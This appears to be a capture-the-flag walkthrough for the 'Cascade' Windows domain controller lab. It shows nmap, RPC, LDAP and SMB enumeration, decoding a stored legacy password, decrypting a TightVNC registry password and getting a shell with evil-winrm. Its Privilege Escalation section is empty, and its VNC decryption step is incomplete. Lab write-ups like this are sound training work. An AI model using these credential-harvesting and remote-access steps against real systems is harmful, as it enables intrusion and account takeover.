# Enumeration
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 06:20 EDT
Nmap scan report for 10.10.10.182
Host is up (0.015s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-29 10:22:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m46s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-29T10:23:00
|_  start_date: 2020-03-29T10:08:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.55 seconds
```
## Initial Foothold

**SMB:**
```bash
smbclient -N -L //10.10.10.182
smbmap -H 10.10.10.182
crackmapexec -u '' -p '' --shares 
```

Found nothing, moved to **RPC:** </br>
```bash
rpcclient -U '' -N 10.10.10.182
rpcclient $> enumdomusers 
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

I copied all to a file called users, and sorted it with the command: ```cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}'``` </br> </br>
**LDAP:** </br>
To enumerate LDAP, first I’ll get the naming context: </br>
**ldapsearch -h10.10.10.182 -x-sbase namingcontexts** </br>
```bash
# extended LDIF
#
# LDAPv3
# base <>(default)with scope baseObject
# filter: (objectclass=*)# requesting: namingcontexts 
#
#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local
# search result
search: 2
result: 0 Success
# numResponses: 2
# numEntries: 1
```

Dump all to a file with: </br>
```ldapsearch -h10.10.10.182 -x-b"DC=cascade,DC=local">ldap_enum``` </br>
After we outputed the  ldap information to a file, we can sort it in a way we'll see what sticks out: </br>
```cat ldap-anonymous | awk '{print $1}' | sort | uniq -c | sort -nr``` </br>
If you want to also get rid of the base64, we can do that: </br> 
```cat ldap-anonymous | awk '{print $1}' | sort | uniq -c | sort -nr | grep ':'``` </br>
Ryan Thompson data had something interesting in it: </br>
```bash
Ryan Thompson data had something interesting in it:
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132299789414187261
lastLogoff: 0
lastLogon: 132299789469255357
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

**cascadeLegacyPwd: clk0bjVldmE=** </br>
Looks like base64, I decoded it:```echo clk0bjVldmE= | base64 -d``` </br>
The result was: ```rY4n5eva``` </br> </br>
```bash
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
```

Only smb option was available: </br>
```crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182``` </br> </br>
**Shares Enumeration:** </br>
```bash
smbclient --user r.thompson //10.10.10.182/data rY4n5eva
mask ""
recurse ON 
prompt OFF 
mget *
```

The interesting files I found: </br>
**VNC Install.reg:** </br>
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f </br>
**Meeting_Notes_June_2018.html:** </br>
"We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password)." </br> </br>
The line ```"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f``` looked very interesting. </br>
First I tried to decrypt it with hex but it didn’t seem to work, I then found out that ``TightVNC``` stores the password in the register encrypted with a static key. </br>
I found a way to decrypt it using [GitHub](https://github.com/frizb/PasswordDecrypts) </br>
I used this command: ```echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass``` </br>
Decrypted password: sT333ve2 </br> </br>
Tried using winrm this time: crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2 </br>
And it worked: </br>
I used evil-winrm and got a shell: ```evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182``` </br>
cd ```C:\Users\s.smith\desktop``` -> type ```user.txt``` -> Got the user flag. </br>
# Privilege Escalation




